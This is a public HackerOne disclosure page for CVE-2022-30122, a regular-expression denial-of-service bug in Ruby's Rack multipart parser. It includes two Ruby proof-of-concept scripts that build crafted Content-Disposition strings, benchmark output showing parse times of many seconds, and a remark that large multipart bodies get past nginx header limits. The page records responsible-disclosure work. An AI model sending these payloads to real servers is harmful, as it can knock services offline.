---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - stack/ruby
substate: "resolved"
weakness: null
enriched: true
date: 2023-07-28
submitted: 2022-02-22T22:34:07.663Z
bounty_usd: null
votes: 18
cve: "CVE-2022-30122"
program: "[[programs/rails|Ruby on Rails]]"
reporter: "ooooooo_q"
source: "https://hackerone.com/reports/1489141"
title: "ReDoS in Rack::Multipart"
---
# ReDoS in Rack::Multipart

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 18 | **Program:** Ruby on Rails | **Disclosed:** 2023-07-28

- Report: [https://hackerone.com/reports/1489141](https://hackerone.com/reports/1489141)
- CWE: N/A | CVE: CVE-2022-30122
- Submitted: 2022-02-22T22:34:07.663Z

## Timeline

- **Report Filed**
- **2022-02-23** @ooooooo_q: I checked `Rack::Multipart::BROKEN_QUOTED` and `Rack::Multipart::BROKEN_UNQUOTED` in the same way.

- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L19
- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L20
- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L304

broken_quoted_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::BROKEN_QUOTED

def attack_text(length)
  "Content-Disposition:a" + "\t" * length + "filename=\"\";" + "\ta=;filename=\"" * length + "\ta="
end

Benchmark.bm do |x|
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(100)[regexp] }
  x.report { attack_text(500)[regexp] }
end
```

```
❯ bundle exec ruby broken_quoted_benchmark.rb
       user     system      total        real
   0.000086   0.000000   0.000086 (  0.000085)
   0.066192   0.000181   0.066373 (  0.066544)
   8.099961   0.026991   8.126952 (  8.153716)
```

broken_unquoted_benchmark.rb

```ruby
require 'benchmark'
require 'rack'

regexp = Rack::Multipart::BROKEN_UNQUOTED

def attack_text(length)
  'Content-Disposition:a' + "\t" * length + "\tfilename=m"
end

Benchmark.bm do |x|
  x.report { attack_text(10)[regexp] }
  x.report { attack_text(100)[regexp] }
  x.report { attack_text(1000)[regexp] }
  x.report { attack_text(10000)[regexp] }
  x.report { attack_text(100000)[regexp] }
end
```

```
❯ bundle exec ruby broken_unquoted_benchmark.rb
       user     system      total        real
   0.000006   0.000000   0.000006 (  0.000005)
   0.000035   0.000000   0.000035 (  0.000035)
   0.002508   0.000045   0.002553 (  0.002569)
   0.246365   0.000167   0.246532 (  0.247299)
  25.003012   0.064393  25.067405 ( 25.146015)
```  

`Rack::Multipart::BROKEN_UNQUOTED` is detected as `2nd degree polynomial` by `recheck`, and it seems that 10kb ~ 100kb are required to make it an attack.

When I tried it, even if nginx is used, it seems to be treated as a body size limit (1Mb) if it is in multipart, unlike the http header size limit.

There are other regular expressions that are detected as `2nd degree polynomial`, so they are likely to be affected in the same way.
- **Report Triaged**
- **Cve Id Added**
- **Report Resolved**
- **2022-06-09** @ooooooo_q: @tenderlove 
I have confirmed that Rack::Multipart::BROKEN_QUOTED and Rack::Multipart::BROKEN_UNQUOTED have been fixed in Rack 2.2.3.1.

I see that this has not been fixed for Rack::Multipart::RFC2183, will this be fixed in a other process, or should I have made it as a separate report in hackerone?
- **2022-07-04** @ooooooo_q: @tenderlove @rails
Should it be created as a separate report?
- **Agreed On Going Public**
- **2023-07-16** @ooooooo_q: @rafaelfranca 

The PoC in this report contains CVE-2022-44572(https://hackerone.com/reports/1639882), is it safe to disclose?
- **Report Became Public**
